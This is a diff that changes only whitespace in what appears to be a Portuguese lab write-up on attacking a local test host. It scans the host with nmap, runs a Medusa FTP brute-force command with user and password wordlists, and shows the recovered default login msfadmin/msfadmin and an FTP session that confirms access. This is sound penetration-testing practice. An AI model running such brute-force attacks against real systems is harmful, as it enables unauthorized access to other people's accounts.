@@ -42,24 +42,34 @@ Enumeração do serviço
 nmap -p -sV 192.168.56.101
 
 saída:
+
 PORT    STATE  SERVICE  VERSION
 
 21/tcp  open   ftp      vsftpd 2.3.4
 
 Ataque com Medusa:
+
 medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp -n 21 -f -O results/medusa_ftp.txt
 
 Resultado:
+
 cat results/medusa_ftp.txt
+
 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
 
 
 Validação do acesso:
+
 ftp 192.168.56.101
+
 user: msfadmin
+
 password: msfadmin
+
 ftp> ls
+
 (diretórios listados)
+
 ftp> quit
 
 
